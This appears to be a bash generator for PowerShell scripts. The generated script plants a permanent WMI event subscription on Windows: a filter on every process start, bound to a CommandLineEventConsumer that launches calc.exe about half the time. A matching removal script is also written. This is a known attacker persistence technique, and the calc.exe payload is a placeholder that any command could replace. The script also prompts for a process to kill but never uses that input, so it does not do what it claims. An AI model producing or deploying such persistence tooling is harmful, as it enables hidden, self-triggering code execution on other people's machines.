#!/bin/bash



echo "Enter name of process to kill (ex.  notepad.exe)"
read exe
echo "Enter name for filter (ex. ServiceFilter)"
read filter
echo "Enter name for consumer (ex. ServiceConsumer)"
read consumer
echo "Enter path for output file"
read tgt
delete="_remove"
remove_file=$tgt$delete
percent=50

echo -e "\n\nProcess to Kill:  $exe"
echo "Filter Name:      $filter"
echo "Consumer Name:    $consumer"
echo "Output File:      $tgt"
echo "Removal File:     $remove_file"
echo -e "\n\nPress Enter to continue, CTRL+C to abort"
read continue

echo "\$instanceFilter = ([wmiclass]\"\\\\.\\root\\subscription:__EventFilter\").CreateInstance()" > $tgt
echo "\$instanceFilter.QueryLanguage = \"WQL\"" >> $tgt
echo "\$instanceFilter.Query = \"select * from Win32_ProcessStartTrace\"" >> $tgt
echo "\$instanceFilter.Name = \"$filter\"" >> $tgt
echo "\$instanceFilter.EventNamespace = 'root\cimv2'" >> $tgt
echo "\$result = \$instanceFilter.Put()" >> $tgt

echo "\$newFilter = \$result.Path" >> $tgt
echo "\$instanceConsumer = ([wmiclass]\"\\\\.\\root\\subscription:CommandLineEventConsumer\").CreateInstance()" >> $tgt
echo "\$instanceConsumer.Name = '$consumer'" >> $tgt
echo "\$instanceConsumer.CommandLineTemplate  = \"powershell -c \`\"\`\$x=Get-Random -min 0 -max 99;if(\`\$x -lt $percent){calc.exe}\`\"\"" >> $tgt
echo "\$result = \$instanceConsumer.Put()" >> $tgt
echo "\$newConsumer = \$result.Path" >> $tgt

echo "\$instanceBinding = ([wmiclass]\"\\\\.\\root\\subscription:__FilterToConsumerBinding\").CreateInstance()" >> $tgt
echo "\$instanceBinding.Filter = \$newFilter" >> $tgt
echo "\$instanceBinding.Consumer = \$newConsumer" >> $tgt
echo "\$result = \$instanceBinding.Put()" >> $tgt
echo "\$newBinding = \$result.Path" >> $tgt

echo "\$x=\"\\\\.\\root\\subscription:__EventFilter.Name='$filter'\"" > $remove_file
echo "([wmi]\$x).Delete()" >> $remove_file
echo "\$x=\"\\\\.\\root\\subscription:CommandLineEventConsumer.Name='$consumer'\"" >> $remove_file
echo "([wmi]\$x).Delete()" >> $remove_file
echo "\$x='\\\\.\\root\\subscription:__FilterToConsumerBinding.Consumer=\"\\\\\\\\.\\\\root\\\\subscription:CommandLineEventConsumer.Name=\\\"$consumer\\\"\",Filter=\"\\\\\\\\.\\\\root\\\\subscription:__EventFilter.Name=\\\"$filter\\\"\"'" >> $remove_file
echo "([wmi]\$x).Delete()" >> $remove_file

echo -e "\n\nComplete..."






